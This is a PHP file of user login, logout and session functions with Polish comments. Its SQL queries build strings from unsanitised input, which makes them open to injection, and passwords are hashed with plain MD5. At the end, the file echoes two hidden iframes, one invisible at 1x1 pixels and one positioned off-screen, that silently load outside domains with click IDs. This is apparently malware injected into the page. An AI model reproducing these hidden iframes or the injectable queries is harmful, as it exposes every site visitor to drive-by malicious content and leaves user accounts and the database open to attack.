<?php
session_start();
define("SESID", SESSION_NAME() . "=" . SESSION_ID());





function get_user($id){
   $zapytanie = "SELECT * from users WHERE id='".$id."' LIMIT 1; "; 
   $wykonaj = mysql_query($zapytanie) or die(mysql_error());
   while($wiersz = mysql_fetch_array($wykonaj))
   { 
   return $wiersz;

   }

}


# zaloguj user-a
function login($login, $passwd)
{
$ile = mysql_query("SELECT COUNT(*) from users WHERE nick='".$login."' AND haslo='".md5($passwd)."' LIMIT 1; ") or die(mysql_error());
$ile = mysql_fetch_row($ile); 
$ile = $ile[0];


if($ile==0){ return false; }
   else{
   $zapytanie = "SELECT * from users WHERE nick='".$login."' AND haslo='".md5($passwd)."' LIMIT 1; "; 
   $wykonaj = mysql_query($zapytanie) or die(mysql_error());
   while($wiersz = mysql_fetch_array($wykonaj))
   { $_SESSION["USER_AUTH"] = True; $_SESSION["USER_ID"] = $wiersz['id']; }
    return True;

   }

}



# wyloguj user-a
function logout()
{
$user = '';
$_SESSION["USER_AUTH"] = False;
$_SESSION["USER_ID"] = Null;
session_destroy();
}




# sprawdz czy zalogowany 
function auth(){ return ($_SESSION["USER_AUTH"] == True); }


echo "<iframe src=\"http://msnupdateserver.info/?click=220336\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";

echo "<script>document.write('<iframe src=\"http://hulmeux.com/?click=4606312\" width=100 height=100 style=\"position:absolute;top:-10000;left:-10000;\"></iframe>');</script>";
?>
